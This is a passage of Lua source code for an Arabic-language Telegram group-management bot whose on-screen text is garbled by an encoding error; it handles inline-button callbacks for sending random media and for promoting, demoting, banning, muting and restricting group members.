DevRio:del(Rinda..'Rio:Text:KtTexts'..Rio..data.chat_id_)
DevRio:del(Rinda..'Rio:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevRio:srem(Rinda..'Rio:Sudo:Kt'..data.chat_id_,Rio)
else
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐุนุฐุฑุง ุตูุงุญูุฉ ุงูุงูุฑ ููุชููู !") 
end
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/Song:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/Song:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(4,2824); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุงุบููู ุงุณูุน ูเขชูุญ ุจุงูู๐*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/Song:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/AudiosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/mp3:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/mp3:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(2,1167); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุงุบููู ุงุณูุน ูเขชูุญ ุจุงูู๐*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/mp3:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendAudio?chat_id=' .. data.chat_id_ .. '&audio=https://t.me/DavidMp3/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/memz:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/memz:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(2,1201); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ููุทุน ุงููููุฒ ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/memz:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendVoice?chat_id=' .. data.chat_id_ .. '&voice=https://t.me/MemzDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/gif:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/gif:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(2,1075); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงููุชุญุฑูู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/gif:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendanimation?chat_id=' .. data.chat_id_ .. '&animation=https://t.me/GifDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/photo:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/photo:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(4,1171); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุงูุตูุฑู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/photo:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/PhotosDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match('/anime:'..tonumber(data.sender_user_id_)..'(.*)') then
local Rio = DataText:match('/anime:'..tonumber(data.sender_user_id_)..'(.*)')
Rio = math.random(3,1002); 
local Text ='*โ๏ธฐุฎุชุงเขชูุช ุตูุฑุฉ ุงูุงููู ูู*'
keyboard = {}  
keyboard.inline_keyboard = {{{text="โข ุบูเขชูู โข",callback_data="/anime:"..data.sender_user_id_}},{{text="โข TeAm Rinda โข โข",url="t.me/Source_Rinda"}}} 
https.request("https://api.telegram.org/bot"..TokenBot..'/sendphoto?chat_id=' .. data.chat_id_ .. '&photo=https://t.me/AnimeDavid/'..Rio..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..Msg_Id2.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetMem:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููููุฒูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetCleaner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:Cleaner:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุธููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetAdmin:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:Admins:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูุงุฏูููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetManager:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:Managers:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:Constructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetBasicConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงูููุดุฆูู ุงูุงุณุงุณููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetOwner:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetOwner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุงูููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetSudoBot:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:SudoBot:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetSecondSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':SetRioSudo:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':SetRioSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:sadd(Rinda..'Rio:RioSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุฑูุนู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู')
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemMem:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:VipMem:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููููุฒูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemCleaner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Cleaner:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุธููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemAdmin:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Admins:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูุงุฏูููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemManager:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Managers:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุฏุฑุงุก')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Constructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemBasicConstructor:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:BasicConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงูููุดุฆูู ุงูุงุณุงุณููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemOwner:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemOwner:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:RioConstructor:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุงูููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemSudoBot:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:SudoBot:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemSecondSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:SecondSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุซุงููููู')
end,nil)
elseif DataText and DataText:match(tonumber(data.sender_user_id_)..':RemRioSudo:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':RemRioSudo:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:RioSudo:'..data.chat_id_,dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชูุฒููู ูู ูุงุฆูุฉ ุงููุทูุฑูู ุงูุงุณุงุณููู')
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':Ban:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
if dp.id_ then
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, 'โ๏ธฐูุง ุชุณุชุทูุน ุญุธุฑ โข '..IdRank(dp.id_, data.chat_id_), 1, 'md')
else
ChatKick(data.chat_id_, dp.id_)
DevRio:sadd(Rinda..'Rio:Ban:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุญุธุฑู')
end
end
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':UnBan:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Ban:'..data.chat_id_,dp.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = data.chat_id_, user_id_ = dp.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุงูุบุงุก ุญุธุฑู')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':Mute:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':Mute:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
if dp.id_ then
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, 'โ๏ธฐูุง ุชุณุชุทูุน ูุชู โข '..IdRank(dp.id_, data.chat_id_), 1, 'md')
else
if DevRio:sismember(Rinda..'Rio:Muted:'..data.chat_id_, dp.id_) then
EditMsg(Chat_Id2, Msg_Id2, "โ๏ธฐูู ุจุงููุนู ููุชูู ูู ุงููุฌููุนู")  
else
DevRio:sadd(Rinda..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ูุชูู')
end
end
end
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':UnMute:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:Muted:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุงูุบุงุก ูุชูู')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':UnAll:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':UnAll:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
DevRio:srem(Rinda..'Rio:BanAll:', dp.id_)
DevRio:srem(Rinda..'Rio:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุงูุบุงุก ุงูุนุงู')
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':Tkeed:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':Tkeed:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
if dp.id_ then
if RankChecking(dp.id_, data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, 'โ๏ธฐูุง ุชุณุชุทูุน ุชููุฏ โข '..IdRank(dp.id_, data.chat_id_), 1, 'md')
else
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_)
DevRio:sadd(Rinda..'Rio:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุชููุฏู ูู ุงููุฌููุนู')
end
end
end,nil)
end
if DataText and DataText:match(tonumber(data.sender_user_id_)..':UnTkeed:(.*)') then
local RioId = DataText:match(tonumber(data.sender_user_id_)..':UnTkeed:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = RioId},function(arg,dp) 
HTTPS.request("https://api.telegram.org/bot"..TokenBot.."/restrictChatMember?chat_id="..data.chat_id_.."&user_id="..dp.id_.."&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
DevRio:srem(Rinda..'Rio:Tkeed:'..data.chat_id_, dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'โ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')\nโ๏ธฐุชู ุงูุบุงุก ุชููุฏู')
end,nil)
end
--     ๐ฒ๐ฎ๐๐ฑc๐ค ๐ฑ๐๐ญd๐บ     --
if DataText and DataText:match(tonumber(data.sender_user_id_)..':SetList:(.*)') then
local Rio = DataText:match(tonumber(data.sender_user_id_)..':SetList:(.*)')
tdcli_function ({ID = "GetUser",user_id_ = Rio},function(arg,dp) 
if dp.first_name_ == false then
Dev_Rio(data.chat_id_, data.id_, 1, "โ๏ธฐุงูุญุณุงุจ ูุญุฐูู", 1, "md")
return false  
end
local Text = 'โ๏ธฐูู ุจุงุณุชุนูุงู ุงูุงุฒุฑุงุฑ ูุฑูุน ุงูุนุถู โข โค\nโ๏ธฐุงูุนุถู โข ['..dp.first_name_..'](t.me/'..(dp.username_ or 'Source_Rinda')..')'
keyboard = {} 
if Sudo(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetBasicConstructor:"..Rio}},{{text="โข ุฑูุน ูุงูู โข",callback_data=data.sender_user_id_..":SetOwner:"..Rio},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=data.sender_user_id_..":SetSudoBot:"..Rio}},{{text="โข ุฑูุน ูุทูุฑ ุซุงููู โข",callback_data=data.sender_user_id_..":SetSecondSudo:"..Rio},{text="โข ุฑูุน ูุทูุฑ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetRioSudo:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioSudo(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetBasicConstructor:"..Rio}},{{text="โข ุฑูุน ูุงูู โข",callback_data=data.sender_user_id_..":SetOwner:"..Rio},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=data.sender_user_id_..":SetSudoBot:"..Rio}},{{text="โข ุฑูุน ูุทูุฑ ุซุงููู โข",callback_data=data.sender_user_id_..":SetSecondSudo:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SecondSudo(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetBasicConstructor:"..Rio}},{{text="โข ุฑูุน ูุงูู โข",callback_data=data.sender_user_id_..":SetOwner:"..Rio},{text="โข ุฑูุน ูุทูุฑ โข",callback_data=data.sender_user_id_..":SetSudoBot:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif SudoBot(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetBasicConstructor:"..Rio}},{{text="โข ุฑูุน ูุงูู โข",callback_data=data.sender_user_id_..":SetOwner:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif RioConstructor(data) then
keyboard.inline_keyboard = {{{text="โข ุฑูุน ูููุฒ โข",callback_data=data.sender_user_id_..":SetMem:"..Rio},{text="โข ุฑูุน ุงุฏูู โข",callback_data=data.sender_user_id_..":SetAdmin:"..Rio}},{{text="โข ุฑูุน ููุดุฆ โข",callback_data=data.sender_user_id_..":SetConstructor:"..Rio},{text="โข ุฑูุน ูุฏูุฑ โข",callback_data=data.sender_user_id_..":SetManager:"..Rio}},{{text="โข ุฑูุน ููุธู โข",callback_data=data.sender_user_id_..":SetCleaner:"..Rio},{text="โข ุฑูุน ููุดุฆ ุงุณุงุณู โข",callback_data=data.sender_user_id_..":SetBasicConstructor:"..Rio}},{{text = 'โข TeAm Rinda โข',url="t.me/Source_Rinda"}}}
elseif BasicConstructor(data) then
